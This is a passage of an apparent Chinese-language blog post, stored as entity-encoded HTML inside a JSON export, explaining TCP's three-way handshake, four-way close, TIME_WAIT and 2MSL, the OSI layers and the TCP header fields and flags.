;&#x7EDC;&#xFF0C;&#x6015;Server&#x7AEF;&#x4E0D;&#x77E5;&#x9053;&#x8981;&#x5173;&#x95ED;&#xFF0C;&#x6240;&#x4EE5;&#x53D1;&#x9001;ACK&#x540E;&#x8FDB;&#x5165;TIME_WAIT&#x72B6;&#x6001;&#xFF0C;&#x5982;&#x679C;Server&#x7AEF;&#x6CA1;&#x6709;&#x6536;&#x5230;ACK&#x5219;&#x53EF;&#x4EE5;&#x91CD;&#x4F20;</strong>&#x3002;&#x201D;Server&#x7AEF;&#x6536;&#x5230;ACK&#x540E;&#xFF0C;&#x201D;<strong>&#x5C31;&#x77E5;&#x9053;&#x53EF;&#x4EE5;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x4E86;</strong>&#x201C;&#x3002;Client&#x7AEF;&#x7B49;&#x5F85;&#x4E86;2MSL&#x540E;&#x4F9D;&#x7136;&#x6CA1;&#x6709;&#x6536;&#x5230;&#x56DE;&#x590D;&#xFF0C;&#x5219;<strong>&#x8BC1;&#x660E;Server&#x7AEF;&#x5DF2;&#x6B63;&#x5E38;&#x5173;&#x95ED;&#xFF0C;&#x90A3;&#x597D;&#xFF0C;&#x6211;Client&#x7AEF;&#x4E5F;&#x53EF;&#x4EE5;&#x5173;&#x95ED;&#x8FDE;&#x63A5;&#x4E86;</strong>&#x3002;Ok&#xFF0C;TCP&#x8FDE;&#x63A5;&#x5C31;&#x8FD9;&#x6837;&#x5173;&#x95ED;&#x4E86;&#xFF01;</p>\n<p>&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;Client&#x7AEF;&#x6240;&#x7ECF;&#x5386;&#x7684;&#x72B6;&#x6001;&#x5982;&#x4E0B;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/7.jpg\" alt=\"\"></p>\n<p>&#x800C;Server&#x7AEF;&#x6240;&#x7ECF;&#x5386;&#x7684;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/8.jpg\" alt=\"\"></p>\n<hr>\n<h2 id=\"&#x76F8;&#x5173;&#x7591;&#x95EE;\"><a href=\"#&#x76F8;&#x5173;&#x7591;&#x95EE;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x7591;&#x95EE;\"></a>&#x76F8;&#x5173;&#x7591;&#x95EE;</h2><p><strong>&#x3010;&#x95EE;&#x9898;1&#x3011;&#x4E3A;&#x4EC0;&#x4E48;&#x8FDE;&#x63A5;&#x7684;&#x65F6;&#x5019;&#x662F;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#xFF0C;&#x5173;&#x95ED;&#x7684;&#x65F6;&#x5019;&#x5374;&#x662F;&#x56DB;&#x6B21;&#x63E1;&#x624B;&#xFF1F;</strong><br>&#x7B54;&#xFF1A;&#x56E0;&#x4E3A;&#x5F53;Server&#x7AEF;&#x6536;&#x5230;Client&#x7AEF;&#x7684;SYN&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x53D1;&#x9001;SYN+ACK&#x62A5;&#x6587;&#x3002;&#x5176;&#x4E2D;ACK&#x62A5;&#x6587;&#x662F;&#x7528;&#x6765;&#x5E94;&#x7B54;&#x7684;&#xFF0C;SYN&#x62A5;&#x6587;&#x662F;&#x7528;&#x6765;&#x540C;&#x6B65;&#x7684;&#x3002;&#x4F46;&#x662F;&#x5173;&#x95ED;&#x8FDE;&#x63A5;&#x65F6;&#xFF0C;&#x5F53;Server&#x7AEF;&#x6536;&#x5230;FIN&#x62A5;&#x6587;&#x65F6;&#xFF0C;&#x5F88;&#x53EF;&#x80FD;&#x5E76;&#x4E0D;&#x4F1A;&#x7ACB;&#x5373;&#x5173;&#x95ED;SOCKET&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x80FD;&#x5148;&#x56DE;&#x590D;&#x4E00;&#x4E2A;ACK&#x62A5;&#x6587;&#xFF0C;&#x544A;&#x8BC9;Client&#x7AEF;&#xFF0C;&#x201D;&#x4F60;&#x53D1;&#x7684;FIN&#x62A5;&#x6587;&#x6211;&#x6536;&#x5230;&#x4E86;&#x201D;&#x3002;&#x53EA;&#x6709;&#x7B49;&#x5230;&#x6211;Server&#x7AEF;&#x6240;&#x6709;&#x7684;&#x62A5;&#x6587;&#x90FD;&#x53D1;&#x9001;&#x5B8C;&#x4E86;&#xFF0C;&#x6211;&#x624D;&#x80FD;&#x53D1;&#x9001;FIN&#x62A5;&#x6587;&#xFF0C;&#x56E0;&#x6B64;&#x4E0D;&#x80FD;&#x4E00;&#x8D77;&#x53D1;&#x9001;&#x3002;&#x6545;&#x9700;&#x8981;&#x56DB;&#x6B65;&#x63E1;&#x624B;&#x3002;</p>\n<p><strong>&#x3010;&#x95EE;&#x9898;2&#x3011;&#x4E3A;&#x4EC0;&#x4E48;TIME_WAIT&#x72B6;&#x6001;&#x9700;&#x8981;&#x7ECF;&#x8FC7;2MSL(&#x6700;&#x5927;&#x62A5;&#x6587;&#x6BB5;&#x751F;&#x5B58;&#x65F6;&#x95F4;)&#x624D;&#x80FD;&#x8FD4;&#x56DE;&#x5230;CLOSE&#x72B6;&#x6001;&#xFF1F;</strong><br>&#x7B54;&#xFF1A;&#x867D;&#x7136;&#x6309;&#x9053;&#x7406;&#xFF0C;&#x56DB;&#x4E2A;&#x62A5;&#x6587;&#x90FD;&#x53D1;&#x9001;&#x5B8C;&#x6BD5;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8FDB;&#x5165;CLOSE&#x72B6;&#x6001;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x5FC5;&#x987B;&#x5047;&#x8C61;&#x7F51;&#x7EDC;&#x662F;&#x4E0D;&#x53EF;&#x9760;&#x7684;&#xFF0C;&#x6709;&#x53EF;&#x4EE5;&#x6700;&#x540E;&#x4E00;&#x4E2A;ACK&#x4E22;&#x5931;&#x3002;&#x6240;&#x4EE5;TIME_WAIT&#x72B6;&#x6001;&#x5C31;&#x662F;&#x7528;&#x6765;&#x91CD;&#x53D1;&#x53EF;&#x80FD;&#x4E22;&#x5931;&#x7684;ACK&#x62A5;&#x6587;&#x3002;</p>\n<p><strong>&#x3010;&#x95EE;&#x9898;3&#x3011;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x80FD;&#x7528;&#x4E24;&#x6B21;&#x63E1;&#x624B;&#x8FDB;&#x884C;&#x8FDE;&#x63A5;&#xFF1F;</strong><br>&#x6211;&#x4EEC;&#x77E5;&#x9053;&#xFF0C;3&#x6B21;&#x63E1;&#x624B;&#x5B8C;&#x6210;&#x4E24;&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x65E2;&#x8981;&#x53CC;&#x65B9;&#x505A;&#x597D;&#x53D1;&#x9001;&#x6570;&#x636E;&#x7684;&#x51C6;&#x5907;&#x5DE5;&#x4F5C;(&#x53CC;&#x65B9;&#x90FD;&#x77E5;&#x9053;&#x5F7C;&#x6B64;&#x5DF2;&#x51C6;&#x5907;&#x597D;)&#xFF0C;&#x4E5F;&#x8981;&#x5141;&#x8BB8;&#x53CC;&#x65B9;&#x5C31;&#x521D;&#x59CB;&#x5E8F;&#x5217;&#x53F7;&#x8FDB;&#x884C;&#x534F;&#x5546;&#xFF0C;&#x8FD9;&#x4E2A;&#x5E8F;&#x5217;&#x53F7;&#x5728;&#x63E1;&#x624B;&#x8FC7;&#x7A0B;&#x4E2D;&#x88AB;&#x53D1;&#x9001;&#x548C;&#x786E;&#x8BA4;&#x3002;<br>&#x73B0;&#x5728;&#x628A;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x6539;&#x6210;&#x4EC5;&#x9700;&#x8981;&#x4E24;&#x6B21;&#x63E1;&#x624B;&#xFF0C;&#x6B7B;&#x9501;&#x662F;&#x53EF;&#x80FD;&#x53D1;&#x751F;&#x7684;&#x3002;&#x4F5C;&#x4E3A;&#x4F8B;&#x5B50;&#xFF0C;&#x8003;&#x8651;&#x8BA1;&#x7B97;&#x673A;S&#x548C;C&#x4E4B;&#x95F4;&#x7684;&#x901A;&#x4FE1;&#xFF0C;&#x5047;&#x5B9A;C&#x7ED9;S&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x5206;&#x7EC4;&#xFF0C;S&#x6536;&#x5230;&#x4E86;&#x8FD9;&#x4E2A;&#x5206;&#x7EC4;&#xFF0C;&#x5E76;&#x53D1;&#x9001;&#x4E86;&#x786E;&#x8BA4;&#x5E94;&#x7B54;&#x5206;&#x7EC4;&#x3002;&#x6309;&#x7167;&#x4E24;&#x6B21;&#x63E1;&#x624B;&#x7684;&#x534F;&#x5B9A;&#xFF0C;S&#x8BA4;&#x4E3A;&#x8FDE;&#x63A5;&#x5DF2;&#x7ECF;&#x6210;&#x529F;&#x5730;&#x5EFA;&#x7ACB;&#x4E86;&#xFF0C;&#x53EF;&#x4EE5;&#x5F00;&#x59CB;&#x53D1;&#x9001;&#x6570;&#x636E;&#x5206;&#x7EC4;&#x3002;&#x53EF;&#x662F;&#xFF0C;C&#x5728;S&#x7684;&#x5E94;&#x7B54;&#x5206;&#x7EC4;&#x5728;&#x4F20;&#x8F93;&#x4E2D;&#x88AB;&#x4E22;&#x5931;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5C06;&#x4E0D;&#x77E5;&#x9053;S&#x662F;&#x5426;&#x5DF2;&#x51C6;&#x5907;&#x597D;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;S&#x5EFA;&#x7ACB;&#x4EC0;&#x4E48;&#x6837;&#x7684;&#x5E8F;&#x5217;&#x53F7;&#xFF0C;C&#x751A;&#x81F3;&#x6000;&#x7591;S&#x662F;&#x5426;&#x6536;&#x5230;&#x81EA;&#x5DF1;&#x7684;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x5206;&#x7EC4;&#x3002;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;C&#x8BA4;&#x4E3A;&#x8FDE;&#x63A5;&#x8FD8;&#x672A;&#x5EFA;&#x7ACB;&#x6210;&#x529F;&#xFF0C;&#x5C06;&#x5FFD;&#x7565;S&#x53D1;&#x6765;&#x7684;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#x5206; &#x7EC4;&#xFF0C;&#x53EA;&#x7B49;&#x5F85;&#x8FDE;&#x63A5;&#x786E;&#x8BA4;&#x5E94;&#x7B54;&#x5206;&#x7EC4;&#x3002;&#x800C;S&#x5728;&#x53D1;&#x51FA;&#x7684;&#x5206;&#x7EC4;&#x8D85;&#x65F6;&#x540E;&#xFF0C;&#x91CD;&#x590D;&#x53D1;&#x9001;&#x540C;&#x6837;&#x7684;&#x5206;&#x7EC4;&#x3002;&#x8FD9;&#x6837;&#x5C31;&#x5F62;&#x6210;&#x4E86;&#x6B7B;&#x9501;&#x3002;</p>\n","excerpt":"<h2 id=\"TCP&#x7B80;&#x4ECB;\"><a href=\"#TCP&#x7B80;&#x4ECB;\" class=\"headerlink\" title=\"TCP&#x7B80;&#x4ECB;\"></a>TCP&#x7B80;&#x4ECB;</h2><p>&#x9996;&#x5148;&#x6765;&#x770B;&#x770B;OSI&#x7684;&#x4E03;&#x5C42;&#x6A21;&#x578B;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/1.jpg\" alt=\"\"></p>\n<p>&#x6211;&#x4EEC;&#x9700;&#x8981;&#x77E5;&#x9053;TCP&#x5DE5;&#x4F5C;&#x5728;&#x7F51;&#x7EDC;OSI&#x7684;&#x4E03;&#x5C42;&#x6A21;&#x578B;&#x4E2D;&#x7684;&#x7B2C;&#x56DB;&#x5C42;&#x2014;&#x2014;Transport&#x5C42;&#xFF0C;IP&#x5728;&#x7B2C;&#x4E09;&#x5C42;&#x2014;&#x2014;Network&#x5C42;&#xFF0C;ARP&#x5728;&#x7B2C;&#x4E8C;&#x5C42;&#x2014;&#x2014;Data Link&#x5C42;&#xFF1B;&#x5728;&#x7B2C;&#x4E8C;&#x5C42;&#x4E0A;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x6211;&#x4EEC;&#x628A;&#x5B83;&#x53EB;Frame&#xFF0C;&#x5728;&#x7B2C;&#x4E09;&#x5C42;&#x4E0A;&#x7684;&#x6570;&#x636E;&#x53EB;Packet&#xFF0C;&#x7B2C;&#x56DB;&#x5C42;&#x7684;&#x6570;&#x636E;&#x53EB;Segment&#x3002; &#x540C;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7B80;&#x5355;&#x7684;&#x77E5;&#x9053;&#xFF0C;&#x6570;&#x636E;&#x4ECE;&#x5E94;&#x7528;&#x5C42;&#x53D1;&#x4E0B;&#x6765;&#xFF0C;&#x4F1A;&#x5728;&#x6BCF;&#x4E00;&#x5C42;&#x90FD;&#x4F1A;&#x52A0;&#x4E0A;&#x5934;&#x90E8;&#x4FE1;&#x606F;&#xFF0C;&#x8FDB;&#x884C;&#x5C01;&#x88C5;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x53D1;&#x9001;&#x5230;&#x6570;&#x636E;&#x63A5;&#x6536;&#x7AEF;&#x3002;&#x8FD9;&#x4E2A;&#x57FA;&#x672C;&#x7684;&#x6D41;&#x7A0B;&#x4F60;&#x9700;&#x8981;&#x77E5;&#x9053;&#xFF0C;&#x5C31;&#x662F;&#x6BCF;&#x4E2A;&#x6570;&#x636E;&#x90FD;&#x4F1A;&#x7ECF;&#x8FC7;&#x6570;&#x636E;&#x7684;&#x5C01;&#x88C5;&#x548C;&#x89E3;&#x5C01;&#x88C5;&#x7684;&#x8FC7;&#x7A0B;&#x3002; &#x5728;OSI&#x4E03;&#x5C42;&#x6A21;&#x578B;&#x4E2D;&#xFF0C;&#x6BCF;&#x4E00;&#x5C42;&#x7684;&#x4F5C;&#x7528;&#x548C;&#x5BF9;&#x5E94;&#x7684;&#x534F;&#x8BAE;&#x5982;&#x4E0B;&#xFF1A; </p>","more":"<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/2.jpg\" alt=\"\"></p>\n<p>TCP&#x662F;&#x4E00;&#x4E2A;&#x534F;&#x8BAE;&#xFF0C;&#x90A3;&#x8FD9;&#x4E2A;&#x534F;&#x8BAE;&#x662F;&#x5982;&#x4F55;&#x5B9A;&#x4E49;&#x7684;&#xFF0C;&#x5B83;&#x7684;&#x6570;&#x636E;&#x683C;&#x5F0F;&#x662F;&#x4EC0;&#x4E48;&#x6837;&#x5B50;&#x7684;&#x5462;&#xFF1F;&#x8981;&#x8FDB;&#x884C;&#x66F4;&#x6DF1;&#x5C42;&#x6B21;&#x7684;&#x5256;&#x6790;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x4E86;&#x89E3;&#xFF0C;&#x751A;&#x81F3;&#x662F;&#x719F;&#x8BB0;TCP&#x534F;&#x8BAE;&#x4E2D;&#x6BCF;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x542B;&#x4E49;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/3.jpg\" alt=\"\"></p>\n<p>&#x4E0A;&#x9762;&#x5C31;&#x662F;TCP&#x534F;&#x8BAE;&#x5934;&#x90E8;&#x7684;&#x683C;&#x5F0F;&#xFF0C;&#x7531;&#x4E8E;&#x5B83;&#x592A;&#x91CD;&#x8981;&#x4E86;&#xFF0C;&#x662F;&#x7406;&#x89E3;&#x5176;&#x5B83;&#x5185;&#x5BB9;&#x7684;&#x57FA;&#x7840;&#xFF0C;&#x4E0B;&#x9762;&#x5C31;&#x5C06;&#x6BCF;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x4FE1;&#x606F;&#x90FD;&#x8BE6;&#x7EC6;&#x7684;&#x8BF4;&#x660E;&#x4E00;&#x4E0B;&#x3002;</p>\n<ul>\n<li>Source Port&#x548C;Destination Port:&#x5206;&#x522B;&#x5360;&#x7528;16&#x4F4D;&#xFF0C;&#x8868;&#x793A;&#x6E90;&#x7AEF;&#x53E3;&#x53F7;&#x548C;&#x76EE;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#xFF1B;&#x7528;&#x4E8E;&#x533A;&#x522B;&#x4E3B;&#x673A;&#x4E2D;&#x7684;&#x4E0D;&#x540C;&#x8FDB;&#x7A0B;&#xFF0C;&#x800C;IP&#x5730;&#x5740;&#x662F;&#x7528;&#x6765;&#x533A;&#x5206;&#x4E0D;&#x540C;&#x7684;&#x4E3B;&#x673A;&#x7684;&#xFF0C;&#x6E90;&#x7AEF;&#x53E3;&#x53F7;&#x548C;&#x76EE;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x914D;&#x5408;&#x4E0A;IP&#x9996;&#x90E8;&#x4E2D;&#x7684;&#x6E90;IP&#x5730;&#x5740;&#x548C;&#x76EE;&#x7684;IP&#x5730;&#x5740;&#x5C31;&#x80FD;&#x552F;&#x4E00;&#x7684;&#x786E;&#x5B9A;&#x4E00;&#x4E2A;TCP&#x8FDE;&#x63A5;&#xFF1B;</li>\n<li>Sequence Number:&#x7528;&#x6765;&#x6807;&#x8BC6;&#x4ECE;TCP&#x53D1;&#x7AEF;&#x5411;TCP&#x6536;&#x7AEF;&#x53D1;&#x9001;&#x7684;&#x6570;&#x636E;&#x5B57;&#x8282;&#x6D41;&#xFF0C;&#x5B83;&#x8868;&#x793A;&#x5728;&#x8FD9;&#x4E2A;&#x62A5;&#x6587;&#x6BB5;&#x4E2D;&#x7684;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5B57;&#x8282;&#x5728;&#x6570;&#x636E;&#x6D41;&#x4E2D;&#x7684;&#x5E8F;&#x53F7;&#xFF1B;&#x4E3B;&#x8981;&#x7528;&#x6765;&#x89E3;&#x51B3;&#x7F51;&#x7EDC;&#x62A5;&#x4E71;&#x5E8F;&#x7684;&#x95EE;&#x9898;&#xFF1B;</li>\n<li>Acknowledgment Number:32&#x4F4D;&#x786E;&#x8BA4;&#x5E8F;&#x5217;&#x53F7;&#x5305;&#x542B;&#x53D1;&#x9001;&#x786E;&#x8BA4;&#x7684;&#x4E00;&#x7AEF;&#x6240;&#x671F;&#x671B;&#x6536;&#x5230;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x5E8F;&#x53F7;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x786E;&#x8BA4;&#x5E8F;&#x53F7;&#x5E94;&#x5F53;&#x662F;&#x4E0A;&#x6B21;&#x5DF2;&#x6210;&#x529F;&#x6536;&#x5230;&#x6570;&#x636E;&#x5B57;&#x8282;&#x5E8F;&#x53F7;&#x52A0;1&#x3002;&#x4E0D;&#x8FC7;&#xFF0C;&#x53EA;&#x6709;&#x5F53;&#x6807;&#x5FD7;&#x4F4D;&#x4E2D;&#x7684;ACK&#x6807;&#x5FD7;&#xFF08;&#x4E0B;&#x9762;&#x4ECB;&#x7ECD;&#xFF09;&#x4E3A;1&#x65F6;&#x8BE5;&#x786E;&#x8BA4;&#x5E8F;&#x5217;&#x53F7;&#x7684;&#x5B57;&#x6BB5;&#x624D;&#x6709;&#x6548;&#x3002;&#x4E3B;&#x8981;&#x7528;&#x6765;&#x89E3;&#x51B3;&#x4E0D;&#x4E22;&#x5305;&#x7684;&#x95EE;&#x9898;&#xFF1B;</li>\n<li>Offset:&#x7ED9;&#x51FA;&#x9996;&#x90E8;&#x4E2D;32 bit&#x5B57;&#x7684;&#x6570;&#x76EE;&#xFF0C;&#x9700;&#x8981;&#x8FD9;&#x4E2A;&#x503C;&#x662F;&#x56E0;&#x4E3A;&#x4EFB;&#x9009;&#x5B57;&#x6BB5;&#x7684;&#x957F;&#x5EA6;&#x662F;&#x53EF;&#x53D8;&#x7684;&#x3002;&#x8FD9;&#x4E2A;&#x5B57;&#x6BB5;&#x5360;4bit&#xFF08;&#x6700;&#x591A;&#x80FD;&#x8868;&#x793A;15&#x4E2A;32bit&#x7684;&#x7684;&#x5B57;&#xFF0C;&#x5373;4*15=60&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x9996;&#x90E8;&#x957F;&#x5EA6;&#xFF09;&#xFF0C;&#x56E0;&#x6B64;TCP&#x6700;&#x591A;&#x6709;60&#x5B57;&#x8282;&#x7684;&#x9996;&#x90E8;&#x3002;&#x7136;&#x800C;&#xFF0C;&#x6CA1;&#x6709;&#x4EFB;&#x9009;&#x5B57;&#x6BB5;&#xFF0C;&#x6B63;&#x5E38;&#x7684;&#x957F;&#x5EA6;&#x662F;20&#x5B57;&#x8282;&#xFF1B;</li>\n<li>TCP Flags:TCP&#x9996;&#x90E8;&#x4E2D;&#x6709;6&#x4E2A;&#x6807;&#x5FD7;&#x6BD4;&#x7279;&#xFF0C;&#x5B83;&#x4EEC;&#x4E2D;&#x7684;&#x591A;&#x4E2A;&#x53EF;&#x540C;&#x65F6;&#x88AB;&#x8BBE;&#x7F6E;&#x4E3A;1&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x7528;&#x4E8E;&#x64CD;&#x63A7;TCP&#x7684;&#x72B6;&#x6001;&#x673A;&#x7684;&#xFF0C;&#x4F9D;&#x6B21;&#x4E3A;URG&#xFF0C;ACK&#xFF0C;PSH&#xFF0C;RST&#xFF0C;SYN&#xFF0C;FIN&#x3002;&#x6BCF;&#x4E2A;&#x6807;&#x5FD7;&#x4F4D;&#x7684;&#x610F;&#x601D;&#x5982;&#x4E0B;&#xFF1A;<ul>\n<li>URG&#xFF1A;&#x6B64;&#x6807;&#x5FD7;&#x8868;&#x793A;TCP&#x5305;&#x7684;&#x7D27;&#x6025;&#x6307;&#x9488;&#x57DF;&#xFF08;&#x540E;&#x9762;&#x9A6C;&#x4E0A;&#x5C31;&#x8981;&#x8BF4;&#x5230;&#xFF09;&#x6709;&#x6548;&#xFF0C;&#x7528;&#x6765;&#x4FDD;&#x8BC1;TCP&#x8FDE;&#x63A5;&#x4E0D;&#x88AB;&#x4E2D;&#x65AD;&#xFF0C;&#x5E76;&#x4E14;&#x7763;&#x4FC3;&#x4E2D;&#x95F4;&#x5C42;&#x8BBE;&#x5907;&#x8981;&#x5C3D;&#x5FEB;&#x5904;&#x7406;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#xFF1B;</li>\n<li>ACK&#xFF1A;&#x6B64;&#x6807;&#x5FD7;&#x8868;&#x793A;&#x5E94;&#x7B54;&#x57DF;&#x6709;&#x6548;&#xFF0C;&#x5C31;&#x662F;&#x8BF4;&#x524D;&#x9762;&#x6240;&#x8BF4;&#x7684;TCP&#x5E94;&#x7B54;&#x53F7;&#x5C06;&#x4F1A;&#x5305;&#x542B;&#x5728;TCP&#x6570;&#x636E;&#x5305;&#x4E2D;&#xFF1B;&#x6709;&#x4E24;&#x4E2A;&#x53D6;&#x503C;&#xFF1A;0&#x548C;1&#xFF0C;&#x4E3A;1&#x7684;&#x65F6;&#x5019;&#x8868;&#x793A;&#x5E94;&#x7B54;&#x57DF;&#x6709;&#x6548;&#xFF0C;&#x53CD;&#x4E4B;&#x4E3A;0&#xFF1B;</li>\n<li>PSH&#xFF1A;&#x8FD9;&#x4E2A;&#x6807;&#x5FD7;&#x4F4D;&#x8868;&#x793A;Push&#x64CD;&#x4F5C;&#x3002;&#x6240;&#x8C13;Push&#x64CD;&#x4F5C;&#x5C31;&#x662F;&#x6307;&#x5728;&#x6570;&#x636E;&#x5305;&#x5230;&#x8FBE;&#x63A5;&#x6536;&#x7AEF;&#x4EE5;&#x540E;&#xFF0C;&#x7ACB;&#x5373;&#x4F20;&#x9001;&#x7ED9;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x5728;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#x6392;&#x961F;&#xFF1B;</li>\n<li>RST&#xFF1A;&#x8FD9;&#x4E2A;&#x6807;&#x5FD7;&#x8868;&#x793A;&#x8FDE;&#x63A5;&#x590D;&#x4F4D;&#x8BF7;&#x6C42;&#x3002;&#x7528;&#x6765;&#x590D;&#x4F4D;&#x90A3;&#x4E9B;&#x4EA7;&#x751F;&#x9519;&#x8BEF;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x4E5F;&#x88AB;&#x7528;&#x6765;&#x62D2;&#x7EDD;&#x9519;&#x8BEF;&#x548C;&#x975E;&#x6CD5;&#x7684;&#x6570;&#x636E;&#x5305;&#xFF1B;</li>\n<li>SYN&#xFF1A;&#x8868;&#x793A;&#x540C;&#x6B65;&#x5E8F;&#x53F7;&#xFF0C;&#x7528;&#x6765;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x3002;SYN&#x6807;&#x5FD7;&#x4F4D;&#x548C;ACK&#x6807;&#x5FD7;&#x4F4D;&#x642D;&#x914D;&#x4F7F;&#x7528;&#xFF0C;&#x5F53;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x7684;&#x65F6;&#x5019;&#xFF0C;SYN=1&#xFF0C;ACK=0&#xFF1B;&#x8FDE;&#x63A5;&#x88AB;&#x54CD;&#x5E94;&#x7684;&#x65F6;&#x5019;&#xFF0C;SYN=1&#xFF0C;ACK=1&#xFF1B;&#x8FD9;&#x4E2A;&#x6807;&#x5FD7;&#x7684;&#x6570;&#x636E;&#x5305;&#x7ECF;&#x5E38;&#x88AB;&#x7528;&#x6765;&#x8FDB;&#x884C;&#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x3002;&#x626B;&#x63CF;&#x8005;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x53EA;&#x6709;SYN&#x7684;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x5982;&#x679C;&#x5BF9;&#x65B9;&#x4E3B;&#x673A;&#x54CD;&#x5E94;&#x4E86;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5305;&#x56DE;&#x6765; &#xFF0C;&#x5C31;&#x8868;&#x660E;&#x8FD9;&#x53F0;&#x4E3B;&#x673A;&#x5B58;&#x5728;&#x8FD9;&#x4E2A;&#x7AEF;&#x53E3;&#xFF1B;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x8FD9;&#x79CD;&#x626B;&#x63CF;&#x65B9;&#x5F0F;&#x53EA;&#x662F;&#x8FDB;&#x884C;TCP&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x7684;&#x7B2C;&#x4E00;&#x6B21;&#x63E1;&#x624B;&#xFF0C;&#x56E0;&#x6B64;&#x8FD9;&#x79CD;&#x626B;&#x63CF;&#x7684;&#x6210;&#x529F;&#x8868;&#x793A;&#x88AB;&#x626B;&#x63CF;&#x7684;&#x673A;&#x5668;&#x4E0D;&#x5F88;&#x5B89;&#x5168;&#xFF0C;&#x4E00;&#x53F0;&#x5B89;&#x5168;&#x7684;&#x4E3B;&#x673A;&#x5C06;&#x4F1A;&#x5F3A;&#x5236;&#x8981;&#x6C42;&#x4E00;&#x4E2A;&#x8FDE;&#x63A5;&#x4E25;&#x683C;&#x7684;&#x8FDB;&#x884C;TCP&#x7684;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#xFF1B;</li>\n<li>FIN&#xFF1A; &#x8868;&#x793A;&#x53D1;&#x9001;&#x7AEF;&#x5DF2;&#x7ECF;&#x8FBE;&#x5230;&#x6570;&#x636E;&#x672B;&#x5C3E;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x53CC;&#x65B9;&#x7684;&#x6570;&#x636E;&#x4F20;&#x9001;&#x5B8C;&#x6210;&#xFF0C;&#x6CA1;&#x6709;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x4F20;&#x9001;&#x4E86;&#xFF0C;&#x53D1;&#x9001;FIN&#x6807;&#x5FD7;&#x4F4D;&#x7684;TCP&#x6570;&#x636E;&#x5305;&#x540E;&#xFF0C;&#x8FDE;&#x63A5;&#x5C06;&#x88AB;&#x65AD;&#x5F00;&#x3002;&#x8FD9;&#x4E2A;&#x6807;&#x5FD7;&#x7684;&#x6570;&#x636E;&#x5305;&#x4E5F;&#x7ECF;&#x5E38;&#x88AB;&#x7528;&#x4E8E;&#x8FDB;&#x884C;&#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x3002;</li>\n</ul>\n</li>\n<li>Window:&#x7A97;&#x53E3;&#x5927;&#x5C0F;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6709;&#x540D;&#x7684;&#x6ED1;&#x52A8;&#x7A97;&#x53E3;&#xFF0C;&#x7528;&#x6765;&#x8FDB;&#x884C;&#x6D41;&#x91CF;&#x63A7;&#x5236;&#xFF1B;&#x8FD9;&#x662F;&#x4E